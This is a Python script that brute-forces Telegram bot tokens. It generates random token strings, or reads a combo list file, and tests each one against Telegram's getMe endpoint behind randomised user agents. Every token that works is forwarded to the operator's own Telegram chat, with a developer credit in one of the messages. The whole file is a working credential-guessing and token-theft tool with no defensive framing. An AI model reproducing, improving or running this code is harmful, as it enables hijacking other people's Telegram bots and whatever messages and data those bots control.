import requests
import random
import user_agent
import colorama
Fore = colorama.Fore.BLUE
Back = colorama.Back.BLACK
b = colorama.Cursor.BACK()
n = colorama.Style.BRIGHT
session = requests.Session()
Tken = input(f"{Fore}{n}{b}{Back}Enter your Token :  ")
ID = input("Enter youtr ID:  ")
mode = input("[1] Check with Combo list \n\n[2] Without Combo list\n\n     :  ")
headers = {"User-Agent": user_agent.generate_user_agent()}
if mode == "2":
    def cap():
       while True:
            cap = ""
            for h in range(2):
                c = random.choice("ABCDEFGHIJKLMNOPQRSTYWXYZ123456789")
                cap += c
            return cap
    def first_num():
        while True:
            numbers = ""
            for h in range(10):
                n = random.choice("12345678909876543212345678900987654321")
                numbers += n
            return numbers
    def chr():
        while True:
            t = ""
            for world in range(31):
                cul = random.choice("qwertyuiopasdgfhjklzx_cvbn-mQWERTYUIOPASDGFHJKLZXCVBNMqwertyuiopasdgfhjklzxcvbnmQWERTYUIOPASDGFHJKLZXCVBNM_1234567890")
                t += cul
            return t
    while True:
        all = f"{first_num()}:AA{cap()}{chr()}"
        req = session.get(f"https://api.telegram.org/bot{all}/getme", headers=headers).status_code
        if req == 200:
            print("available Token✅",all)
            session.post(f'https://api.telegram.org/bot{Tken}/sendMessage?chat_id={ID}&text=*Available Token*:\n\n`{all}`  Developer |  @M_4_I&parse_mode=Markdown')
        elif req == 401:
            print("not Available ❌",all)
        else:
            print("unknow Error")
elif mode == "1":
    file_name = input("Enter Combo  File Name:  ")
    while True:
        for x in open(file_name, "r").read().splitlines():
            req = session.get(f"https://api.telegram.org/bot{x}/getme", headers=headers).status_code
            if req == 200:
                print("available Token✅",x)
                session.post(f'https://api.telegram.org/bot{Tken}/sendMessage?chat_id={ID}&text=*Available Token*:\n\n`{x}` &parse_mode=Markdown')
            elif req == 401:
                print("not Available ❌",x)
            else:
                print("Unknown Error")
else:
    print("Bye")